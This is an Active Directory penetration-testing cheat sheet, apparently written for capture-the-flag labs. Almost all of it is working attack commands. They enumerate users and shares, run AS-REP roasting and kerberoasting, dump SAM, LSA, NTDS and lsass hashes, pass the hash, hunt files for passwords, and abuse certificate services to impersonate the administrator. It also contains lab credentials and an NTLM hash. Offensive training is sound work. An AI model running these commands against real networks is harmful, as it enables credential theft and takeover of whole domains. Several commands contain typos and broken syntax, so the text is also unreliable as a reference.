# The real method

### Bloodhound says all, for the user  node thhe outbound connections are important

For each user check:
  - netexec smb/rdp/rpc/mssql/winrm/wmi 
  - kerberoasting
  - Certification (certipy)
  - Bloodhound path (shortest and outbound control)
  - Windows Privilege Escalation (PowerUp, WinPeas)
  - whoami /all (if we can escalate privileges there)

without password:
  - asreproasting

  If none:
    - credential hunting
    - searching in files

No usernames:
  - netexec smb/rdp/rpc/mssql/winrm/wmi -u "" -p "" --users/--rid-brute/--shares
  - netexec smb/rdp/rpc/mssql/winrm/wmi -u "guest" -p "" --users/--rid-brute/--shares

In generel serach all
- C:\ (look at all files)

```shell
netexec ldap -u '<username>' -p '<password>' <target> --bloodhound --collection All
```

### help

```shell
ls -force
ls -force <directory_name> -recurse
tree /a /f
```

### Basics

```shell
# nmap
nmap -p- -Pn <target> -v -T5 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn <target> -sC -sV -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn <target> -v --script vuln -oN nmap_vuln.txt

# Anonymous login (rpc,smb,ldap)
rpcclient -U  "" -p "" <target>
rpcclient -U  "" -N <target>
rpcclient -u  "guest" -p "" <target> # after  success enumdomusers
rpcclient -u  <userfile> -p "" <target> # after  success enumdomusers
smbclient -L  //<target>
smbclient -N  //<target>//<share_name>
netexec smb -u '' -p '' <target>

#these not only smb but all smb/rdp/rpc/mssql/winrm/wmi
netexec smb -u '<username>' -p '<password>' <target> --sam
netexec smb -u '<username>' -p '<password>' <target> --ntds
netexec smb -u '<username>' -p '<password>' <target> --lsa
netexec smb -u '<username>' -p '<password>' <target> --loggedon-users
netexec smb -u '<username>' -p '<password>' <target> --spider <share_name>
netexec smb -u '<username>' -p '<password>' <target> -M spider_plus -o DOWNLOAD_FLAG=true
netexec smb -u '<username>' -p '<password>' <target> --users
netexec smb -u '<username>' -p '<password>' <target> --shares
netexec smb -u '<username>' -p '<password>' <target> --shares --spider Shares --regex .
netexec ldap -u '' -p '' <target> --users
netexec ldap -u 'guest' -p '' <target> --users
netexec ldap -u '<username>' -p '<password>' <target> --bloodhound --collection All
netexec ldap -u '<username>' -p '<password>' <target> --bloodhound --collection All --dns-server <target_ip>
netexec ldap BABYDC.baby.vl -u '' -p '' --query "(sAMAccountName=*)" ""
bloodhound-python -c All -u 'svc_admin' -p 'P@ssw0rd123!' -d 'megacorp.local' -ns 10.10.1.5
netexec smb -u 'guest' -p '' <target> (--shares/--users/--rid-brute)
enum4linux -a <target>
nmap -n -sV --script "ldap* and not brute" -p 389 <target>
evil-winrm -i <target> -u <username> -p "<password>"
impacket-lookupsid 'guest'@<target>

certipy-ad find -u "" -p "" -dc-ip <target> -vulnerable
certipy-ad find -u "<username>" -p "<password>" -dc-ip <target> -vulnerable
certipy req
cetipy auth

#nfs enumeration
showmount -e <target>

# get password files
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.ini,*.xml,*.txt -File -ErrorActon SilentlyContinue | Where-Object { $_.FullName -notmatch 'Windows|System32|SysWOW64' } | Select-String -Pattern "password=" 

# get domain name
netexec smb <target>
dnsrecon -d "<domain_name>" -n <target>

# find usernames from websites and stuff and then convert to ad-like
https://github.com/urbanadventurer/username-anarchy
./username-anarchy

https://github.com/mohinparamasivam/AD-Username-Generator
python3 username-generator.py -u <username_file> -o <output_file>

# then kerbrute to validate the usernames to find existing
kerbrute userenum <nbame_file> --dc <target> -d <domain_name>

# AsrepRoast
GetNPUsers.py <domain_name>/<username> -dc-ip <dc_ip> -no-pass
impacket-getNPUsers <domain>/ -dc-ip <target_ip> -usersfile <username_file> -outputfile <output_filename>
.\Rubeus.exe asreproast /outfile:<output_filename>


# if password and usrename kerberoast
GetUserSPNs.py <domain_name>/<username>:"<password>" -dc-ip <dc_ip>
GetUserSPNs.py <domain_name>/<username>:"<password>" -dc-ip <dc_ip> -request
impacket-GetUserSPNs <domain_name>/<username>:"<password>" -dc-ip <dc_ip> -request

# if stuck run winpeas
.\winpeas.exe

#then login to shares try all, if pwn3d! then we are admin on that device
netexec <smb/rdp/rpc/mssql/winrm/wmi> -u <username> -p <password> <target>
impacket-psexec <domain_name>/<username>:<password>@<target
impacket-wmiexec <domain_name>/<username>:<password>@<target


https://github.com/icsharpcode/AvaloniaILSpy/releases

# dump hashes
impacket-secretsdump -just-dc-ntlm <domain_name>/<username>:<password>@<target
netexec smb -u '<username>' -p '<password>' <target> --sam

# then maybe pass the hash
impacket-psexec <domain_name>/<username>:@<target> -hashes :<hash>
impacket-wmiexec <domain_name>/<username>:@<target> -hashes :<hash>
netexec <smb/rdp/rpc/mssql/winrm/wmi> -u <username> -h <hash> <target>
netexec <smb/rdp/rpc/mssql/winrm/wmi> -u <username> -H <hash_file> <target> --continue-on-success
evil-winrm -i <target> -u <username> -H <hash>

```

```shell
netexec smb <target> -u '<username>' -p '<password>' -M lsassy | fgrep -v '[' | awk '{print $6}' >> dumped_hashes.txt
netexec smb <target> -u '<username>' -p '<password>' -M ntdsutil | fgrep -v '[' | awk '{print $4}' >> dumped_hashes.txt
netexec smb <target> -u '<username>' -p '<password>' --rid-rute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee users.txt
netexec smb <target> -u '<username>' -p '<password>' --users | awk '{print$ 5}' | fgrep -v '[*]' | tee users.txt

netexec ldap 10.129.132.22 -u '' -p '' --users | grep -oP 'CN=\K[^,]+'
```

```shell

# Check for PrintNightmare
icacls.exe "C:\Windows\System32\spoolsv.exe"

# Transfer files
impacket-smbshare share ./ -user test -password ''
net use \\<attacker_ip>\share
. .\PowerUp.ps1;Invoke-AllChecks
```

```shell
# Check if Applocker is running
powershell -C Get-Service AppIDSvc
setspn -T medin -Q ?*/*


```

### Check for sensitive files

```shell
# for the userlist find and replace \n with ,
paste -sd ', ' data.txt
tr '\n' ' ' < data.txt | sed 's/ $/, /g; s/, / /'

# and then check for
cat C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsolleHost_history.txt
cmdkey /list


check c:\ location for silly stuff
check with ls -force too for silly hidden files

Get-ChildItem -Path C:\ -Recurse -Force -Include .config,.ini,.xml,.bak,*.txt -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'Windows\System32|SysWOW64' } | Select-String -Pattern "password="

Get-ChildItem -Path C:\ -Recurse -Force -Include .config,.ini,.xml,.bak,*.txt -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'Windows\System32|SysWOW64' } | Select-String -Pattern "pwd=", "password=", "username=", "user="

Get-ChildItem -Path C:\ -Recurse -Force -Include .config,.ini,.xml,.bak,.txt,.ps1 -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'Windows\System32|SysWOW64|VMware|All Users|ProgramData' } | Select-String -Pattern "pwd", "pass", "password=", "username=", "user=", "marko", "zach", "Administrator", ryan, Administrator, Guest, krbtgt, DefaultAccount, ryan, marko, sunita, abigail, marcus, sally, fred, angela, felicia, gustavo, ulf, stevie, claire, paulo, steve, annette, annika, per, claude, melanie, zach, simon, naoki
```

### Certificate Service (ADCS)

```shell
# ensure all domains are in the /etc/hosts

https://github.com/ly4k/Certipy/wiki/06---Privilege-Escalation

impacket-owneredit -action write -target-dn 'DC=<dc_before_dot,DC=<dc_after_dot>' -new-owner '<name_of__username>' -target <username_of_the_ca_authority>' '<domain_name>'/'<username_also_new_owner>':'<password>'

impacket-dacledit -action write -rights 'FullControl' -principal '<name_of__username>' -target <username_of_the_ca_authority>' '<domain_name>'/'<username_also_new_owner>':'<password>'

net rpc password '<ca_username>' '<password>' -U '<domain_name>'/'<username_also_new_owner>':'<password>' -S <target_ip>

# try to get ntlm hashes via unshadowing
bloodyAD, pywhisker
bloodyAD --host 'dc01.fluffy.htb' -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' 'p.agila'
certipy-ad shadow auto -u <username> -p <password> -account <target_account>
certipy-ad shadow auto -u <username> -hashes ':<hash>' -account <target_account>


#check one until success, find  vulnerabilites
certipy-ad find -u <username>@<target_domain> -p '<password>' -dc-ip <target_ip> -vulnerable -stdout
certipy-ad find -u <username>@<target_domain> -hashes :<hash> -vulnerable -stdout -text
certipy-ad find -u <username>@<target_domain> -p '<password>' -dc-ip <target_ip> -text -output certs

cat -n certs_Certipy.txt | grep -iC4 'enrollment rights1 | grep -viE "Enterprise Admins|Domain Admins|Domain Controllers" | fgrep -i '\'

certipy-ad account -u 'p.agila@fluffy.htb'  -p 'prometheusx-303' -upn 'administrator' -user 'ca_svc' update
certipy-ad req -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca 'fluffy-DC01-CA'
certipy-ad account -u 'p.agila@fluffy.htb'  -p 'prometheusx-303' -upn 'ca_svc' -user 'ca_svc' update
certipy-ad auth -pfx administrator.pfx  -domain fluffy.htb -u administrator -dc-ip 10.129.196.255


# the template and stuff can be found in the output of the find command
certipy template -u <username>@<domain_name> -p '<password>' -dc-ip <target_ip> -template 'SecureFiles' -write-default-configuration

certipy req -u <username>@<domain_name> -p '<password>' -dc-ip <target_ip> -target '<domainN_of_ca_target>' -ca '<ca_name>' -template 'SecureFiles' -upn '<who_we_want_to_impeprsonate>@<domain_name>' -sid <sid>

certipy auth -pfx <file.pfx/administrator.pfx> -dc-ip <target_ip>

# then pass the ntlm hash or carck
```
